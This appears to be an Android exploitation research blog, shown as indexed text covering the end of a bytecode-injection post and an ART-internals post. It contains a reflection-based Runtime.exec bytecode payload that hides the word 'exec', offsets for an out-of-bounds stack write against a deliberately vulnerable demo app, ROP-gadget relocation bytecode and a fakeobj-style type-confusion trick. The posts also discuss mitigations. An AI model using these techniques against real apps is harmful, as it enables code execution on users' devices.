TYPE:[Ljava/lang/Class; .new_array(v7, v7, \u0026#39;Class[]\u0026#39;) # 0058: 12 08 CONST_4 v8, #+0 .const_16(v8, 0) # 005a: 1c 09 0c 00 CONST_CLASS v9, TYPE:Ljava/lang/String; .const_class(v9, \u0026#39;String\u0026#39;) # 005e: 4d 09 07 08 APUT_OBJECT v9, v7, v8 .aput_object(v9, v7, v8) # 0062: 6e 30 07 00 65 07 INVOKE_VIRTUAL {v5, v6, v7}, METHOD:Ljava/lang/Class;-\u0026gt;getDeclaredMethod(Ljava/lang/String;,[Ljava/lang/Class;)Ljava/lang/reflect/Method; .invoke_virtual(3, class_getdeclaredmethod_index, [v5, v6, v7]) # 0068: 0c 05 MOVE_RESULT_OBJECT v5 .move_result_object(v5) # 006a: 6e 10 0d 00 01 00 INVOKE_VIRTUAL {v1}, METHOD:Ljava/lang/StringBuilder;-\u0026gt;toString()Ljava/lang/String; .invoke_virtual(1, stringbuilder_tostring_index, [v1]) # 0070: 0c 06 MOVE_RESULT_OBJECT v6 .move_result_object(v6) # 0072: 24 10 15 00 06 00 FILLED_NEW_ARRAY {v6}, TYPE:[Ljava/lang/Object; .filled_new_array(1, \u0026#39;Object[]\u0026#39;, [v6]) # 0078: 0c 06 MOVE_RESULT_OBJECT v6 .move_result_object(v6) # 007a: 6e 30 0f 00 45 06 INVOKE_VIRTUAL {v5, v4, v6}, METHOD:Ljava/lang/reflect/Method;-\u0026gt;invoke(Ljava/lang/Object;,[Ljava/lang/Object;)Ljava/lang/Object; .invoke_virtual(3, method_invoke_index, [v5, v4, v6]) # 0080: 0e 00 RETURN_VOID .return_void() # 0082: 00 00 NOP .nop() # 0084: ARRAY_PAYLOAD Array@{108, 111, 103, 32, 34, 104, 101, 108, 108, 111, 32, 116, 104, 101, 114, 101, 33, 34} .array_payload(2, len(command), command_buffer) # 00b0: ARRAY_PAYLOAD Array@{101, 120, 101, 99} .array_payload(2, 4, b\u0026#39;e\\x00x\\x00e\\x00c\\x00\u0026#39;)).build() The java equivalent could look something like this:\nchar[] cCommand = new char[] { \u0026lt;command\u0026gt; }; StringBuilder bCommand = new StringBuilder(); bCommand.append(cCommand); char[] cExec = new char[] {\u0026#39;e\u0026#39;, \u0026#39;x\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;c\u0026#39;}; StringBuilder bExec = new StringBuilder(); bExec.append(cExec); Runtime runtime = Runtime.getRuntime(); Class\u0026lt;?\u0026gt; runtimeClass = runtime.getClass(); String execName = bExec.toString(); Class[] signature = new Class[] { String.class }; Method exec = runtimeClass.getDeclaredMethod(execName, signature); String command = bCommand.toString(); Object[] args = new Object[] { command }; exec.invoke(runtime, args); The Attack With a payload at hand, it is time to abuse the memory error and obtain arbitrary command execution in the context of the target app.\nBefore injecting the bytecode, the leaked stack address must be understood properly in order to find the exact location of the payload. To that end, a particular execution yields a leak of 0x6eb6aec650. Remember the original C code of writeIndexed:\nextern \u0026#34;C\u0026#34; JNIEXPORT void JNICALL Java_com_poc_poc_1remote_MainActivity_writeIndexed(JNIEnv *env, jclass clazz, jint index, jlong value) __attribute__ ((optnone)) { uint64_t i; uint64_t *buffer = \u0026amp;i; buffer[index] = value; } With that in mind, lets consider the following simplified disassembly of the vulnerable writeIndexed method:\nsub sp, sp, #0x50 stp x29, x30, [sp, #64] add x29, sp, #0x40 ; frame pointer = sp + 0x40 sub x8, x29, #0x10 ; buffer = frame pointer - 0x10 = sp + 0x30 str x8, [sp, #8] ... ldr x9, [sp, #8] ; base address ldrsw x10, [sp, #28] ; index mov x11, #0x8 ; element size madd x9, x10, x11, x9 ; where = index * size + base str x8, [x9] ; indexed write In a nutshell, the buffer is located 0x10 below the old base pointer and return address. This can be confirmed using a debugger:\ngef➤ x/1gx $sp+0x8 0x6eb6aec628: 0x0000006eb6aec650 gef➤ p/x $x29-0x10 $1 = 0x6eb6aec650 Coincidentally, the pointer leaked via leakStack is exactly the base address of the buffer, relative to which the index oob write happens.\nNow, two things must be identified:\nAt what index resides the dex_pc? Where is a save location to store the payload to? The first point is addressed to some degree in a previous section that showed a reverse - engineered view of the stack taking into account nterp and JNI stack frames. Therefore, without showing the details of the stack again, the byte offset to write to can be computed by subtracting the buffer base address from the address of the spilled x22 register. Then, because buffer elements are 64 - bit integers, divide by the element size to obtain the final index (we have an indexed oob write).\ngef➤ p/x (0x00006eb6aec6d8 - 0x00006eb6aec650) / 8 $2 = 0x11 Next, the payload must be stored to a stable region on the stack. Most importantly, no data structures required to continue the execution of the (hijacked) bytecode method that called the writeIndexed method need to be corrupted. So, with some testing, it turns out that the payload may be moved 0x1000 bytes behind the buffer base address, i.e. starting at index 0x1000 / 8 = 0x200.\nFor a PoC , consider the following video.\nContext - Switching In this section, I want to discuss a few approaches on how to handle insufficient contexts during bytecode injection. A major problem is if the context available does not provide enough types or methods to do anything useful. For example, if we were missing the StringBuilder type in the above case study, then the payload would not work. Of course, as is discussed later , we could try to use bytecode as an intermediate stage in case the context is insufficient.\nAlternatively, if an attacker wants to only execute bytecode, because e.g. native - level security mechanisms are preventing any kind of ROP, then the attacker will only be left with switching the context. As of writing, two ways to perform context - switching come to mind. All approaches work by corrupting a different dex_pc than the one that provides an insufficient context. In general, as long as an attacker can ensure that a dex_pc is executed eventually, that dex_pc may be used to switch the execution context. The following visualization shows the high - level idea of context - switching. Notice that the context is determined by an attacker\u0026rsquo;s goals. The first approach is to try to corrupt an ArtMethod that is stored in a predictable location. For this to work, the method must be called after the attacker corrupted the dex_pc. Finding an ArtMethod instance is tricky and may require additional information leaks for a remote attacker. In a local setting, there exists a plethora of ArtMethods to be used by an attacker, e.g. in boot.art.\nSecondly, if an attacker is only given the ability to corrupt stack values, then the bytecode method call chain can be traversed to find a fitting context. Because the Android runtime is complex, often plenty of method invocations are performed until the vulnerable native method is called eventually. This leaves room to corrupt other dex_pcs belonging to parent methods. However, if an attacker is unable to go up the call chain, then it may be possible to go down the call chain. To that end, an attacker needs to be able to invoke a method that takes in a callback. If an attacker is able to pass a callback consisting of custom bytecode into a method, then this will result in a new call chain until the callback is invoked. These ideas are visualized in the following diagram. Basically, the above figure shows stack frames matching a call chain. On the left, an attacker corrupts any spilled dex_pc on the stack, potentially switching the context depending on what method is hijacked. On the right, an attacker somehow manages to pass custom bytecode into a method that eventually invokes that bytecode. From there on, an attacker can either use bytecode to corrupt a legitimate, calling method that stems from the callback call chain, or stay in the context of the callback. Notice, however, that specifying a callback most certainly requires knowledge on the class of the callback object. Therefore, specifying a callback requires knowing the context of the callback, which somewhat defeats the purpose of doing this in the first place.\nRegardless of what approach is used, the absolute best context to end up in is in a .dex file of framework.jar. These .dex files contain a large fraction of the app - related Android runtime and thus provide a lot of types and methods. Moreover, because framework.jar is copied to all apps forked from zygote64, pure bytecode payloads for .dex files of framework.jar are universal for the target device under the assumption that framework.jar does not change.\nFurther Applications The case study shows that bytecode injection can be used to fully take over a thread in the target app via a memory error. For the PoC, bytecode is used to invoke a system command.\nHowever, it is also possible to use bytecode as an intermediate stage, e.g. to set up a ROP chain. To that end, remember that vregs are not bounds - checked. Therefore, any attacker - chosen bytecode can access, i.e. read and write, any value on the stack following the vregs and vrefs arrays of the hijacked method. Ignoring the fact that writing to e.g. v0 almost always writes to r0 as well, it is possible for bytecode to set up ROP gadgets on the stack by filling the right vregs and vrefs that overlap with a return address. Notice that one can use bytecode instructions like move-object to always write a value to both, vregs and vrefs. Then, an attacker can pretend to only write to vrefs to set up the ROP chain on the stack, fully ignoring the fact that writing to vrefs at some point overwrites the values stored in vregs.\nIn the example above, using ROP directly is most likely impossible, because an attacker is lacking knowledge on the location of an executable memory region to return into. However, because bytecode can read beyond the vregs array, an attacker can pick up a code pointer stored on the stack, e.g. a return address, and use it to compute the base address of the associated module. Of course, an attacker must be able to either identify the module to compute the base address, or handle segfaults to probe for the beginning of the memory region. Given the base address, an attacker can then relocate their own gadgets stored inside the bytecode, e.g. as constants encoded inside instructions, to obtain a fully functional ROP chain. Then, what is left is to link the ROP chain into a return address, which kicks off gadget chain execution.\nFor example, the following bytecode can be used to grab the base address of libart.so. Notice that return_address_vreg_index and return_address_offset are to be chosen by an attacker and mean the index of the return address in terms of vregs and the offset of the return address relative to libart.so, respectively.\nmove-wide/16 v0, \u0026lt;return_address_vreg_index\u0026gt; const-wide v2, \u0026lt;return_address_offset\u0026gt; sub-long v0, v0, v2 Once a fitting ROP chain is found, parts of the chain must be marked for dynamic relocation. An example of a ROP chain component that does not need relocation is a command string. Of course, if working with the address of the command string, relocation will be necessary again. Consider the generic bytecode for relocating ROP gadgets:\nconst-wide v2, gadget add-long v2, v2, v\u0026lt;libart_base_vreg_index\u0026gt; move-object16 v\u0026lt;2 * index + return_address_vreg_index\u0026gt;, v2 move-object16 v\u0026lt;2 * index + return_address_vreg_index + 1\u0026gt;, v3 In a nutshell, gadget is the offset of the current gadget relative to libart.so. The offset is stored to v2 and v3 (64 - bit in total) and added to the vreg that holds the base address of libart.so. Results are stored into v2. Afterwards, move-object16 is utilized to lower and upper 32 - bit values of the relocated address into vregs and vrefs that represent the current ROP chain gadget on the stack. The above code snippet is executed for each ROP gadget, which means the ROP chain is built up one by one at runtime. This is only possible, because vreg and vref indices are not bounds - checked at runtime. Furthermore, observe that gadget offsets are stored inside bytecode and relocated using spilled libart leak.\nWithout discussing all the details of the PoC exploit, the following visualization aims to highlight the general idea of using bytecode to relocate a ROP chain. And finally, to finish off the idea of bytecode - induced ROP attacks, a PoC video is provided!\nAnother interesting approach may be to look into similar bytecode - related exploitation areas, like V8 . Usually, when exploiting a bug in V8, an attacker builds up primtives like fakeobj and addrof, which are often escalated into read and write primitives. Without having looked into this thoroughly, it may be possible to use the same ideas when injecting bytecode to construct and access objects that allow reading from and writing to arbitrary memory regions. However, a limiting factor seems to be that object references are always 32 - bit addresses. Luckily, there exist classes like Parcel and its associated C++ implementation that store 64-bit pointers inside objects. Taking into account that Parcel provides methods like writeLong that writes a 64-bit value to a location relative to an internal pointer, Parcel seems like the perfect candidate to build up WWW and RWW primitives from bytecode. Furthermore, Parcel is a very common class and thus available in a plethora of contexts. Unfortunately, due to time constraints, I have not been able to construct a PoC for this idea.\nPossible Mitigations Following native - level mitigations against code injection, the first idea that comes to mind is to somehow force nterp to distinguish between code and data. For example, it may be possible to restrict dex_ptr to .dex files only. However, even inside a .dex file, data and code are mixed. For example, the code_item of a method in a .dex file consists of metadata describing and the concrete bytecode representing the method. Therefore, restricting bytecode execution to .dex files does not suffice, unless it can be guaranteed that redirecting bytecode execution to data structures in a .dex file does not suffice for a successful exploit, which is impossible. Because data and bytecode are closely coupled in memory, nterp cannot use page permissions either: the page permissions are to coarse.\nAnother approach could be to redesign the layout of .dex files, so that bytecode is stored in executable readonly regions, whereas associated data structures are stored in adjacent readonly memory. Whether this is practical or not is to be determined. Such a major redesign would also need rigorous permission checks, because nterp does not have hardware support that prevents execution of non - executable memory.\nSummary In this blog post, the first bytecode - based exploitation technique, namely bytecode injection, is discussed and demonstrated using a simplistic, deliberately vulnerable Android app. Various caveats regarding bytecode injection, like String construction, method invocation and even insufficient contexts, are explained and solved. Furthermore, it is highlighted how bytecode may function as a stepping stone for other attacks like ROP.\nA neat side - effect is that bytecode is architecture - agnostic. Only changes to the bytecode interpreter can prevent that bytecode shellcode executes successfully. Because it is possible to create Android apps for various older Android versions, shellcode can most certainly be constructed as backward - compatible as an app can be.\n","permalink":"https://lolcads.github.io/posts/2024/09/bytecode_exploitation_2/","tags":["Android","Bytecode","Exploitation"],"title":"Bytecode Injection (Part 3)"},{"categories":null,"content":"Fundamentals for Bytecode Exploitation (Part 2) Exploiting a vulnerability always requires a certain knowledge about the operating system, including how processes are launched, what libraries are used and how control - flow \u0026ldquo;works\u0026rdquo;. While the latter could be considered coming from the architecture, this is not always the case on Android, because the Android RunTime (ART) provides ways to call bytecode methods and redirect bytecode control - flow. Hence, ART dictates how bytecode control - flow works, not directly the underlying CPU. Understanding the above mechanisms is the minimal requirement for understanding bytecode - based exploitation. Based on that, more sophisticated analysis techniques can be built specifically for Android bytecode, to make bytecode - based exploitation feasible.\nIn this blog post, we first dive into how Android bytecode methods are invoked, which entails a discussion about how Java classes, objects, methods and fields are handled in memory by ART. Then, we take a look at Android\u0026rsquo;s fork server architecture. Building on this, interesting memory regions common to all Android apps are discussed, which include .dex, .so, .art and .oat files. During all of this, I showcase analysis methods used to practically verify the discussed topics.\nAndroid Runtime Every Android app contains the libart.so library, which is the ART implementation. This is probably the most vital library for Android apps! Not only that, but from the perspective of an attacker trying to abuse a memory error in a JNI function, libart.so is gadget heaven. Among other things, libart.so is responsible for executing bytecode. Further, it dictates the memory layout of methods, fields, classes and thus objects. We start off with some basics on ART structures and Android bytecode, then discuss how Android bytecode is executed.\nART Structures Bytecode operates on data representing methods, fields, classes, objects and more. Therefore, before looking into concrete bytecode implementations, these structures must be discussed. From now on, we assume we are looking at an app written in Java. Also, we do not consider inheritance for simplicity.\nThe most famous structure is probably the (Java) object, which is defined in mirror::Object . Surprisingly, an object consists of only two fields:\nclass Object { HeapReference\u0026lt;Class\u0026gt; klass_; // 32-bit value uint32_t monitor_; } Overall, this means an object is just a 64 - bit value, which seems odd given the fact that in Java we can access all kinds of fields. Conceptually comparable to how Chromium\u0026rsquo;s JavaScript engine V8 handles dynamic objects using the \u0026ldquo;static\u0026rdquo; language C++, Android uses a mirror::Class to define where to find the fields of an object. So, although the C++ representation of an object does not explicitly account for all accessible fields, in memory an object is followed by the concrete values of its fields. The associated Class stored in object-\u0026gt;klass_ contains an array of ArtField objects called Class::ifields_. Each ArtField represents a single field by specifying e.g. the field\u0026rsquo;s type, access flags (like private) and offset relative to the end of the C++ object in memory. Fields stored relative to an object/instance are called instance fields. Static fields are stored relative to the Class.\nIn other words, an object looks like this in memory:\n0x00: object-\u0026gt;klass_ 0x04: object-\u0026gt;monitor_ 0x08: object-\u0026gt;field0 0x0c: object-\u0026gt;field1 ... Usually, fields are 32 - bit values, but some primitive types like long and double require 64 bits. Because ArtFields only tell the runtime where to find a field inside an object\u0026rsquo;s memory and what type that field is, objects are very dynamic in terms of shape. By the way, speaking V8, the Class is somewhat similar to the shape of an object. Consider the following visualization: Although there can be many fields for a particular class instance, Android enforces a particular field order . Hence, unless e.g. field types change, the field order inside an object is constant and thus predictable.\nRegarding method invocations, Android utilizes a structure called ArtMethod . The comments indicate what a field means for a bytecode method:\nclass ArtMethod { uint32_t access_flags_; // A lot of potential flags like \u0026#34;public\u0026#34; uint32_t dex_method_index_; // Index into .dex file (context) uint16_t method_index_; // Index into vtable (?) union { uint16_t hotness_count_; // How often this method is called. Triggers JIT compilation on 0, else \u0026gt; 0. uint16_t imt_index_; // Index into Interface Method Table (IMT) }; struct PtrSizedFields { void *data_; // Reference to code_item in .dex file void *entry_point_from_quick_compiled_code_; // Reference to ExecuteNterpImpl } ptr_sized_fields_; } Of course, an ArtMethod does not necessarily need to represent a bytecode method. The ART provides many kinds of methods, of which a bytecode method is just a single instance.\nThere are various ways an ArtMethod can be linked into a Class, because e.g. Java provides many different types of methods and thus method invocations. For example, if a method is \u0026ldquo;normal\u0026rdquo;, like\nclass Me { public void run() { System.out.println(\u0026#34;What am I reading??\u0026#34;); } } ... new Me().run(); then the method run is invoked via the invoke-virtual bytecode. This means that (a pointer to) the ArtMethod is stored inside the embedded vtable of the class Me, which is located right behind the Class object in memory.\nObviously, things are never simple. To avoid method resolution everytime a method is invoked, Android uses multiple caching layers, one of which is implemented by the DexCache class. In a nutshell, a DexCache is linked to a single .dex file and tries to prevent the runtime from repeatedly parsing the .dex file to e.g. get a type definition. Every Class instance is linked to a single DexCache instance. When invoking a method on an object, the DexCache associated with the class that declares the calling method is used to look up the ArtMethod before parsing the .dex file (if no lower cache layer contains the method). This means any method is bound to a single DexCache and thus to a single .dex file, which I define as the context of a bytecode method. Each method is restricted to the types, methods etc. defined in the context, i.e. the .dex file of the DexCache associated with the declaring class of the method.\nNotice we are only scratching the surface! In a later post, we will investigate how interface method invocation works in detail. Also, observe that there are a lot of cross - references among the above structures. Objects reference their classes, which again reference methods each pointing back to their declaring class. Fields have relative pointers into objects and are referenced by a class. This is what makes understanding and manipulating such structures highly complicated!\nAndroid Bytecode Android bytecode (actually called Dalvik bytecode, but whatever), is what is executed by Android\u0026rsquo;s interpreters. As we focus on Android 13, the main interpreter is called nterp and is mostly written in assembly. There is another interpreter called the switch interpreter, written in C++, but it seems to be rarely used. A single bytecode instruction consists of at least two bytes. Moreover, the number of bytes required for each bytecode instruction is divisible by two. This stems from the fact that bytecode works with so called code units, where 1 code unit = 2 bytes.\nLets consider an example:\n01 12x move vA, vB Actually, the instruction is move vA, vB, because the value 0x01 is the opcode indicating that this instruction is a move and 12x is the format of the instruction. E.g. 12x means op vA, vB. A concrete instance of the above instruction would be\nmove v0, v1 where the value in virtual register v1 is moved/copied into vreg v0. On Intel x64, this is somewhat similar to mov eax, ebx.\nA single vreg can hold a 32 - bit value. Further, each vreg is associated with a virtual reference (vref), which also holds 32 bits. However, vrefs are never accessed directly, i.e. there will never be an instruction like move rA, rB. Instead, vrefs are used to handle object references in the background. For example, let r0 be the vref associated with vreg v0. If v0 holds an integer, i.e. a non - object value, then r0 = 0. However, if v0 holds an object, then r0 also holds the same object. Of course, holding an object means holding an object reference, which must be a valid 32-bit pointer. Depending on what the method containing the bytecode requested, more vregs may be accessible, like v1 or v65535. Vreg indices are always unsigned and not only depend on what the method requested, but also on the bytecode operating on the vreg.\nIn memory, the above example move v0, v1 looks like so:\n01 10 As stated earlier, 01 is the opcode indicating a move. Furthermore, the format op vA, vB indicates that vreg indices are 4 bits each. Basically, each letter in a vreg description, like A in vA, represents another 4 bits available to encode a vreg index. In this case, vA and vB may range from v0 to v(2**4-1)=v15. When writing Java code, there is no way to manually specify the vreg indices. However, when writing bytecode shellcode, care must be taken to not exceed bytecode instruction - enforced ranges. Otherwise, indices may be different from what is needed in the exploit, or throw off following bytecode instructions.\nOne pecularity remains to be discussed: why is v0, v1 translated to 10 in the above example? This stems from the little - endian architecture of the test device. Basically, the format enforces a memory layout like so 01 BA.\nLets consider another example: a \u0026ldquo;normal\u0026rdquo; method invocation\n6e 35c invoke-virtual {vC, vD, vE, vF, vG}, meth@BBBB Similar to before, vC to vG are given 4 bits each to index the vregs that hold method arguments. Two things are odd though:\nWhere is A in the above definition? What is meth@BBBB? Regarding the first point, A is a 4 bit value that determines the actual number of arguments passed. Otherwise, any method invocation via invoke-virtual would be forced to handle exactly 5 arguments. Secondly, meth@BBBB is a 16 - bit unsigned index into the method table of the .dex file of the calling/current method, i.e. the context. To make sure this is clear, consider the following example:\npublic void run() { ... invoke-virtual {v0, v1}, meth@1234 ... } Here, the context is the .dex file associated with the ArtMethod representing run! Therefore, if we try to call a method that does not appear inside the context, like Runtime::exec(String command), then an error will be thrown or worse a method with the same method index will be called and cause a crash!\nThe format of invoke-virtual dictates a memory layout like 6e AG BB BB DC FE. If A \u0026lt; 5, then any superfluous vreg indices are set to 0, although they are ignored anyways. Of course, BBBB is stored in little endian.\nFinally, lets consider one last example: creating arrays directly from bytecode\n26 31t fill-array-data vAA, +BBBBBBBB This time, vAA may be any of v0 to v255. Furthermore, +BBBBBBBB is a 32-bit signed branch offset relative to the address of this instruction in code units. Assuming dex_pc is the virtual address of a fill-array-data instruction, to compute the address this instruction is referencing do the following: dex_pc + 2 * (+BBBBBBBB). Because the 32-bit value is signed, whatever is referenced may be located above or below the instruction. Interestingly, the data structure referenced is a fill-array-data-payload:\nName Format ident 0x0300 (u16) element_width u16 size u32 data [u8] Note: Java uses two bytes for a single char. So, to create a char[] directly from bytecode, we must ensure that element_width = 2. Bytecode is full of such caveats!\nAndroid Bytecode Execution Execution of bytecode requires an interpreter, in this case nterp. Given an ArtMethod, the interpreter starts with ExecuteNterpImpl . It sets up the execution environment, which includes\nSpilling registers on stack. Bytecode uses fixed hardware registers , just like native code. Allocating memory for vregs and vrefs. These are initialized to 0. Setting up arguments to be passed to the invoked method. Below are the most important hardware registers and their descriptions:\nRegister Description x19 Thread pointer x29 Interpreted frame pointer x25 Base of vrefs x22 Interpreted program counter (dex_pc) Usually, native code execution involves managing stack frames, which seems daunting considering the complexity of ART. Luckily, the documentation of nterp, despite spread over various files, is pretty good. Hence, the nterp stack layout is fully documented:\n/* ---------------- * | | All callee save registers of the platform * | callee-save | (core and floating point). * | registers | On x86 and x64 this includes the return address, * | | already spilled on entry. * ---------------- * | x86 args | x86 only: registers used for argument passing. * ---------------- * | alignment | Stack aligment of kStackAlignment. * ---------------- * | | Contains `registers_size` entries (of size 4) from * | dex | the code item information of the method. * | registers | * | | * ---------------- * | | A copy of the dex registers above, but only * | reference | containing references, used for GC. * | registers | * | | * ---------------- * | caller fp | Frame pointer of caller. Stored below the reference * ---------------- registers array for easy access from nterp when returning. * | dex_pc_ptr | Pointer to the dex instruction being executed. * ---------------- Stored whenever nterp goes into the runtime. * | alignment | Pointer aligment for dex_pc_ptr and caller_fp. * ---------------- * | | In case nterp calls compiled code, we reserve space * | out | for out registers. This space will be used for * | registers | arguments passed on stack. * | | * ---------------- * | ArtMethod* | The method being currently executed. * ---------------- \u0026lt;----- STACK POINTER: qword [SP] = ArtMethod* */ Hence, vrefs and vregs are adjacent arrays of 32-bit values. Furthermore, way up the stack are callee - save registers, which will include the dex_pc of the calling function, if the calling function is also a bytecode method, i.e. there is a new return address - do you see where this is going? \u0026gt;:)\nBytecode Oddities With the basics out of the way, lets quickly gloss over some weird things in bytecode. It seems like Android\u0026rsquo;s interpreter nterp is making the following assumption:\nBytecode is correct.\nThis is well - founded under another assumption that bytecode can only originate from e.g. Java or Kotlin. However, in a setting where an attacker is able to control e.g. a stack - buffer overflow, so that the stored bytecode return address is overwritten to point to attacker - controlled memory, this assumption does not hold anymore. Overall, the assumption chain may look like (Bytecode can only originate from Java/Kotlin =\u0026gt; Bytecode is correct) =\u0026gt; No need for checks.\nConsider the implemention of a previous sample bytecode instruction: move vA, vB %def op_move(is_object=\u0026#34;0\u0026#34;): /* for move, move-object, long-to-int */ /* op vA, vB */ lsr w1, wINST, #12 // x1\u0026lt;- B from 15:12 ubfx w0, wINST, #8, #4 // x0\u0026lt;- A from 11:8 FETCH_ADVANCE_INST 1 // advance rPC, load wINST GET_VREG w2, w1 // x2\u0026lt;- fp[B] GET_INST_OPCODE ip // ip\u0026lt;- opcode from wINST .if $is_object SET_VREG_OBJECT w2, w0 // fp[A]\u0026lt;- x2 .else SET_VREG w2, w0 // fp[A]\u0026lt;- x2 .endif GOTO_OPCODE ip // execute next instruction With a basic understanding of assembly, we cannot seem to spot any bounds checks on vreg indices\u0026hellip; Surely they are located in macros like GET_VREG and SET_VREG(_OBJECT)!\n.macro GET_VREG reg, vreg ldr \\reg, [xFP, \\vreg, uxtw #2] .endm .macro GET_VREG_OBJECT reg, vreg ldr \\reg, [xREFS, \\vreg, uxtw #2] .endm .macro SET_VREG reg, vreg str \\reg, [xFP, \\vreg, uxtw #2] str wzr, [xREFS, \\vreg, uxtw #2] .endm .macro SET_VREG_OBJECT reg, vreg str \\reg, [xFP, \\vreg, uxtw #2] str \\reg, [xREFS, \\vreg, uxtw #2] .endm There are no checks! Looking back at the nterp stack frame allows estimating the impact: (almost) arbitrary stack index out - of - bounds access (i.e. read and write). Interestingly, all bytecode implementations I reviewed missed out on index bounds checks.\nWhat is more is that, if we claimed that e.g. v0 contains an object and called move-object v42, v0, then nterp would happily copy it over. Notice that move_object calls op_move(is_object=\u0026quot;1\u0026quot;). For a concrete example of how to interpret an arbitrary value as an object reference, consider the case where the method is allocated enough space to hold four vregs, i.e. v0 to v3 are valid. Knowing that r0 to r3 precede v0 in memory, this also implies that r4 = v0, i.e. r4 and v0 overlap. Hence, setting v0 makes v4 interpret the contents of v0 as an object. Another, similar approach can be seen below:\nconst-wide/32 v0, \u0026lt;fake object address\u0026gt; move-object v0, v0 This works, because op_move v0, v0 moves the value in vreg v0 into both, v0 and r0. I.e. when calling move-object vA, vB, it does not matter whether vB actually contains an object. After the move, whatever was in vB (not rB) will be interpreted as an object in vA. This is kind of like a fakeobj primitive in browser exploitation, i.e. a type confusion.\nIn a nutshell, Android\u0026rsquo;s interpreter nterp blindly trusts that the bytecode to execute is correct and does not try to \u0026ldquo;harm\u0026rdquo; the execution environment. This is what makes bytecode injection a nice intermediate stage to eventually run a JITROP.\nFork Server Architecture on Android A fork server architecture refers to a multi - process mechanism that creates new processes from a base process using the fork syscall, often as a reaction to a certain event. Most importantly, whatever process invokes fork is duplicated, and control - flow for both, parent (old) and child (new) processes, continues right behind the fork syscall instruction. Usually, a C program calling fork looks like so:\npid_t pid = fork(); if (pid \u0026lt; 0) { // error } else if (pid == 0) { // child process } else { // parent process } Assuming the child process does not run execve or similar, child and parent share the same memory layout. This means e.g. that the base addresses of common libraries like libc.so.6 are identical in child and parent processes! Given a vulnerability in the parent process and that an attacker already controls the child process, information leaks are often not required anymore for successful exploitation. To take this even further, not just the layout is identical, but also majority of the contents.\nWhile duplicating processes seems like a bad idea from a security perspective, especially when memory unsafe languages are involved, the fork server architecture can function as a form of optimization. Specifically, on mobile devices with significantly less computational power and memory than your average PC, operating systems can pre - initialize common parts of all apps in a particular base process. Then, when a user starts an app, the base process is forked and app - specific behaviour is loaded - no need to repeat the same initialization phase for each app.\nOf course, Android does exactly that: uses a base process called zygote64 to set up, among other things, the JVM. Also, common shared libraries are loaded, garbage collection is set up, some common objects are created and much more. Although this increases app performance, especially during startup, it also implies that every app knows the majority of the memory layout of all other apps. Notice that the process used for forking, i.e. zygote64, is run by root. Therefore, all \u0026ldquo;normal\u0026rdquo; apps know a lot about the memory layout and contents of a root process!\nNow, lets figure out what and how many memory regions are actually shared!\nMaps Diffing A very simple heuristic to figure out common memory regions over a set of running processes is to use the /proc/\u0026lt;pid\u0026gt;/maps file. Usually, on any operating system not using a fork server architecture, we would expect to have no matching memory regions in terms of name, virtual address, size and permissions. However, knowing that apps are forked from zygote64, we can simply take the intersection of the sets of memory regions of all processes in question to get an approximation for all duplicated memory regions.\nTo get this job done, we can reuse an existing maps parser . The most crucial code can be seen below:\nMAPS_LINE_RE = re.compile(r\u0026#34;\u0026#34;\u0026#34; (?P\u0026lt;addr_start\u0026gt;[0-9a-f]+)-(?P\u0026lt;addr_end\u0026gt;[0-9a-f]+)\\s+ # Address (?P\u0026lt;perms\u0026gt;\\S+)\\s+ # Permissions (?P\u0026lt;offset\u0026gt;[0-9a-f]+)\\s+ # Map offset (?P\u0026lt;dev\u0026gt;\\S+)\\s+ # Device node (?P\u0026lt;inode\u0026gt;\\d+)\\s+ # Inode (?P\u0026lt;pathname\u0026gt;.*)\\s+ # Pathname \u0026#34;\u0026#34;\u0026#34;, re.VERBOSE) @dataclass() class Record: addr_start: int addr_end: int perms: str offset: int dev: str inode: int pathname: str ... def parse(lines: List[str]) -\u0026gt; List[Record]: \u0026#34;\u0026#34;\u0026#34;Parses maps records from the list of all lines in a maps file. \u0026#34;\u0026#34;\u0026#34; return [ Record(*m.groups()) for line in lines if (m := MAPS_LINE_RE.match(line)) is not None ] def diff_regions(lhs: List[Record], rhs: List[Record]) -\u0026gt; List[Record]: \u0026#34;\u0026#34;\u0026#34;Performs lhs = lhs \u0026lt;intersect\u0026gt; rhs in terms of set intersection. \u0026#34;\u0026#34;\u0026#34; return [ lhs[lhs.index(r)] for r in rhs if r in lhs ] Then, with a list of memory regions for each target app, taking the intersection gives the approximate set of duplicated memory regions. Of course, we could simply use zygote64 and any app to get the set of memory regions coming directly from the base process. For a sample comparison on the test device, consider the following output:\n(host)$ python3 ./maps_differ.py \u0026lt;pid of zygote64\u0026gt; \u0026lt;pid of com.google.android.youtube\u0026gt; ... [1754]: 0x78f19d7000 - 0x78f19d9000 (offset: 0x0): [anon:.bss] (rw-p) [1755]: 0x7fdab74000 - 0x7fdab75000 (offset: 0x0): (---p) [1756]: 0x7fdab75000 - 0x7fdb374000 (offset: 0x0): [stack] (rw-p) Total: 1757 Despite looking like a big number, without a reference we cannot make any observations on that number alone. So, consider the number of entries in the /proc/$(pidof zygote64)/maps:\n(device)# wc -l /proc/$(pidof zygote64)/maps 1784 /proc/752/maps This means that 1757 out of 1784 maps entries may have been duplicated during the fork, which is roughly 98.5%. Notice that the child process may have unmapped or remapped some regions of its parent. The above intersection is done on all attributes of the maps entries, meaning that remapping a memory region already causes our analysis to discard that region. However, in this case only memory regions that have not changed are relevant for exploitation! To stabilize this approach, one can repeatedly restart an app and compute the set of common memory regions over multiple app restarts.\nNote: Doing this maps diffing over device reboots reveals two duplicated memory regions, namely [anon:dalvik-main space (region space)] (rw-p) and [anon:dalvik-Sentinel fault page] (---p). However, rebooting the device should also re - randomize the layout of zygote64! Therefore, these two memory regions must be deterministic! While the sentinel fault page does not have any permissions set (maybe look into segfault handlers for special logic for that region), the first region is readable and writable. Hence, even a remote attacker can predict the location of a readable and writable memory region without a concrete information leak other than the target OS version! However, notice that this region is garbage collected and where (Java) objects are stored, so writing without understanding the GC will probably cause various crashes and be very instable.\nObserve that getting an idea of what memory regions are duplicated across all apps allows to make reasonable assumptions on memory region positions in a local attacker scenario. If an attacker controls an unprivileged app, then knowing that e.g. libart.so is duplicated will enable the attacker to make the assumption that his/her location of libart.so is identical to the location in a victim app. Also, the only reason I spotted the deterministic memory regions was because of maps diffing. I never expected to find deterministic memory regions on modern devices and thus did not bother searching.\nMemory Regions With a set of duplicated memory regions at hand, we can now proceed with analysing what is actually shared. To save some time, the following entries are of interest:\n[0001]: 0x6f3be000 - 0x6f64c000 (offset: 0x0): [anon:dalvik-/system/framework/boot.art] (rw-p) [0008]: 0x6fa71000 - 0x6fa72000 (offset: 0x0): 